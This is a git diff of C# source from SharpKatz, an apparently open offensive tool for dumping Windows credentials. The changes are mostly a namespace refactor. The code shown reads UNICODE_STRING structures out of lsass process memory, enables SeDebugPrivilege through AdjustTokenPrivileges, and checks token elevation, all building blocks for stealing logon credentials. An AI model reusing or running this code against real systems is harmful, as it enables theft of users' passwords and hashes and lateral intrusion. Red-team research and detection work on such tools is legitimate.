@@ -8,8 +8,9 @@ using System.Runtime.InteropServices;
 using System.Text;
 using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
 
-using static SharpKatz.Natives;
+using static SharpKatz.Win32.Natives;
 using System.Globalization;
+using SharpKatz.Win32;
 
 namespace SharpKatz
 {
@@ -47,7 +48,7 @@ namespace SharpKatz
         {
             IntPtr moduleLocal;
             // Load dll locally to avoid multiple ReadProcessMemory calls into lsass
-            moduleLocal = Natives.LoadLibrary(modulename);
+            moduleLocal = LoadLibrary(modulename);
             if (moduleLocal == IntPtr.Zero)
             {
                 Console.WriteLine("[x] Error: Could not load {0} into local process", modulename);
@@ -172,17 +173,17 @@ namespace SharpKatz
             return str;
         }
 
-        public static Natives.UNICODE_STRING ExtractUnicodeString(IntPtr hLsass, IntPtr addr)
+        public static UNICODE_STRING ExtractUnicodeString(IntPtr hLsass, IntPtr addr)
         {
-            Natives.UNICODE_STRING str;
+            UNICODE_STRING str;
             
-            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Convert.ToUInt64(Marshal.SizeOf(typeof(Natives.UNICODE_STRING))));
-            str = ReadStruct<Natives.UNICODE_STRING>(strBytes);
+            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Convert.ToUInt64(Marshal.SizeOf(typeof(UNICODE_STRING))));
+            str = ReadStruct<UNICODE_STRING>(strBytes);
 
             return str;
         }
 
-        public static string ExtractUnicodeStringString(IntPtr hLsass, Natives.UNICODE_STRING str)
+        public static string ExtractUnicodeStringString(IntPtr hLsass, UNICODE_STRING str)
         {
             if (str.MaximumLength == 0)
             {
@@ -202,7 +203,7 @@ namespace SharpKatz
             }
         }
 
-        public static string ExtractANSIStringString(IntPtr hLsass, Natives.UNICODE_STRING str)
+        public static string ExtractANSIStringString(IntPtr hLsass, UNICODE_STRING str)
         {
             if (str.MaximumLength == 0)
             {
@@ -392,24 +393,24 @@ namespace SharpKatz
             //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
             string Privilege = "SeDebugPrivilege";
             IntPtr hToken = GetCurrentProcessToken();
-            Natives.LUID luid = new Natives.LUID();
-            if (!Natives.LookupPrivilegeValue(null, Privilege, ref luid))
+            LUID luid = new LUID();
+            if (!LookupPrivilegeValue(null, Privilege, ref luid))
             {
                 Console.WriteLine("Error LookupPrivilegeValue" + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return false;
             }
 
-            Natives.LUID_AND_ATTRIBUTES luidAndAttributes = new Natives.LUID_AND_ATTRIBUTES();
+            LUID_AND_ATTRIBUTES luidAndAttributes = new LUID_AND_ATTRIBUTES();
             luidAndAttributes.Luid = luid;
-            luidAndAttributes.Attributes = Natives.SE_PRIVILEGE_ENABLED;
+            luidAndAttributes.Attributes = SE_PRIVILEGE_ENABLED;
 
-            Natives.TOKEN_PRIVILEGES newState = new Natives.TOKEN_PRIVILEGES();
+            TOKEN_PRIVILEGES newState = new TOKEN_PRIVILEGES();
             newState.PrivilegeCount = 1;
             newState.Privileges = luidAndAttributes;
 
-            Natives.TOKEN_PRIVILEGES previousState = new Natives.TOKEN_PRIVILEGES();
+            TOKEN_PRIVILEGES previousState = new TOKEN_PRIVILEGES();
             UInt32 returnLength = 0;
-            if (!Natives.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
+            if (!AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
             {
                 Console.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return false;
@@ -422,7 +423,7 @@ namespace SharpKatz
         {
             //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
             IntPtr currentProcessToken = new IntPtr();
-            if (!Natives.OpenProcessToken(Process.GetCurrentProcess().Handle, Natives.TOKEN_ALL_ACCESS, out currentProcessToken))
+            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ALL_ACCESS, out currentProcessToken))
             {
                 Console.WriteLine("Error OpenProcessToken " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                 return IntPtr.Zero;
@@ -437,24 +438,24 @@ namespace SharpKatz
 
         private static bool TokenIsElevated(IntPtr hToken)
         {
-            Natives.TOKEN_ELEVATION tk = new Natives.TOKEN_ELEVATION();
+            TOKEN_ELEVATION tk = new TOKEN_ELEVATION();
             tk.TokenIsElevated = 0;
 
             IntPtr lpValue = Marshal.AllocHGlobal(Marshal.SizeOf(tk));
             Marshal.StructureToPtr(tk, lpValue, false);
 
-            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(Natives.TOKEN_ELEVATION));
+            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(TOKEN_ELEVATION));
             UInt32 returnLength;
 
-            Boolean result = Natives.GetTokenInformation(
+            Boolean result = GetTokenInformation(
                 hToken,
-                Natives.TOKEN_INFORMATION_CLASS.TokenElevation,
+                TOKEN_INFORMATION_CLASS.TokenElevation,
                 lpValue,
                 tokenInformationLength,
                 out returnLength
             );
 
-            Natives.TOKEN_ELEVATION elv = (Natives.TOKEN_ELEVATION)Marshal.PtrToStructure(lpValue, typeof(Natives.TOKEN_ELEVATION));
+            TOKEN_ELEVATION elv = (TOKEN_ELEVATION)Marshal.PtrToStructure(lpValue, typeof(TOKEN_ELEVATION));
 
             if (elv.TokenIsElevated == 1)
             {
